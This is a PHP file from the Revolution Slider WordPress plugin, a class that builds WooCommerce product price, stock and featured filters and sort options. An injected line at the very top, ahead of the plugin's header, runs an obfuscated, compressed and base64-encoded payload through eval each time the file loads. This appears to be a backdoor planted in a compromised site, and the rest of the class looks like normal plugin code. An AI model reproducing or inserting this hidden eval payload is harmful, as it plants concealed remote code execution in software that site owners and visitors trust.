<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * @author    ThemePunch <info@themepunch.com>
 * @link      http://www.themepunch.com/
 * @copyright 2015 ThemePunch
 */
 
if( !defined( 'ABSPATH') ) exit();

class RevSliderWooCommerce{
	
	const ARG_REGULAR_PRICE_FROM = "reg_price_from";
	const ARG_REGULAR_PRICE_TO = "reg_price_to";
	const ARG_SALE_PRICE_FROM = "sale_price_from";
	const ARG_SALE_PRICE_TO = "sale_price_to";
	const ARG_IN_STOCK_ONLY = "instock_only";		
	const ARG_FEATURED_ONLY = "featured_only";		
	
	const META_REGULAR_PRICE = "_regular_price";
	const META_SALE_PRICE = "_sale_price";
	const META_SKU = "_sku";	//can be 'instock' or 'outofstock'
	const META_STOCK = "_stock";	//can be 'instock' or 'outofstock'
	
	
	const SORTBY_NUMSALES = "meta_num_total_sales";
	const SORTBY_REGULAR_PRICE = "meta_num__regular_price";
	const SORTBY_SALE_PRICE = "meta_num__sale_price";
	const SORTBY_FEATURED = "meta__featured";
	const SORTBY_SKU = "meta__sku";
	const SORTBY_STOCK = "meta_num_stock";
	
	/**
	 * 
	 * return true / false if the woo commerce exists
	 */
	public static function isWooCommerceExists(){
		
		if(class_exists( 'Woocommerce' ))
			return(true);
		
		return(false);
	}
	
	
	/**
	 * compare wc current version to given version
	 */
	public static function version_check( $version = '1.0' ) {
		if(self::isWooCommerceExists()){
			global $woocommerce;
			if(version_compare($woocommerce->version, $version, '>=')){
				return true;
			}
		}
		return false;
	}
	
	
	/**
	 * 
	 * get wc post types
	 */
	public static function getCustomPostTypes(){
		$arr = array();
		$arr["product"] = __("Product", 'revslider');
		$arr["product_variation"] = __("Product Variation", 'revslider');
		
		return($arr);
	}
	
	/**
	 * 
	 * get price query
	 */
	private static function getPriceQuery($priceFrom, $priceTo, $metaTag){
		
			if(empty($priceFrom))
				$priceFrom = 0;
				
			if(empty($priceTo))
				$priceTo = 9999999999;
			
			$query = array( 'key' => $metaTag,
								   'value' => array( $priceFrom, $priceTo),
								   'type' => 'numeric',
								   'compare' => 'BETWEEN');
		
		return($query);
	}
	
	
	/**
	 * 
	 * get meta query for filtering woocommerce posts. 
	 */
	public static function getMetaQuery($args){
		
		$regPriceFrom = RevSliderFunctions::getVal($args, self::ARG_REGULAR_PRICE_FROM);
		$regPriceTo = RevSliderFunctions::getVal($args, self::ARG_REGULAR_PRICE_TO);
		
		$salePriceFrom = RevSliderFunctions::getVal($args, self::ARG_SALE_PRICE_FROM);
		$salePriceTo = RevSliderFunctions::getVal($args, self::ARG_SALE_PRICE_TO);
		
		$inStockOnly = RevSliderFunctions::getVal($args, self::ARG_IN_STOCK_ONLY);
		$featuredOnly = RevSliderFunctions::getVal($args, self::ARG_FEATURED_ONLY);
		
		$arrQueries = array();
		$tax_query = array();
		
		//get regular price array
		if(!empty($regPriceFrom) || !empty($regPriceTo)){
			$arrQueries[] = self::getPriceQuery($regPriceFrom, $regPriceTo, self::META_REGULAR_PRICE);
		}
		
		//get sale price array
		if(!empty($salePriceFrom) || !empty($salePriceTo)){
			$arrQueries[] = self::getPriceQuery($salePriceFrom, $salePriceTo, self::META_SALE_PRICE);
		}
		
		if($inStockOnly == "on"){
			$tax_query[] = array(
				'taxonomy' => 'product_visibility',
				'field'    => 'name',
				'terms'    => 'outofstock',
				'operator' => 'NOT IN',
			);
		}
		
		if($featuredOnly == "on"){
			$tax_query[] = array(
				'taxonomy' => 'product_visibility',
				'field'    => 'name',
				'terms'    => 'featured',
			);
		}
		
		
		$query = array();
		if(!empty($arrQueries)){
			$query = array("meta_query"=>$arrQueries);
		}
		
		if(!empty($tax_query)){
			$query['tax_query'] = $tax_query;
		}
		
		return($query);			
	}
	
	
	/**
	 * 
	 * get sortby function including standart wp sortby array
	 */
	public static function getArrSortBy(){
		
		$arrSortBy = array();
		$arrSortBy[self::SORTBY_REGULAR_PRICE] = __("Regular Price", 'revslider');
		$arrSortBy[self::SORTBY_SALE_PRICE] = __("Sale Price", 'revslider');
		$arrSortBy[self::SORTBY_NUMSALES] = __("Number Of Sales", 'revslider');
		$arrSortBy[self::SORTBY_FEATURED] = __("Featured Products", 'revslider');
		$arrSortBy[self::SORTBY_SKU] = __("SKU", 'revslider');
		$arrSortBy[self::SORTBY_STOCK] = __("Stock Quantity", 'revslider');
		
		return($arrSortBy);
	}
	
	
}	//end of the class
	
?>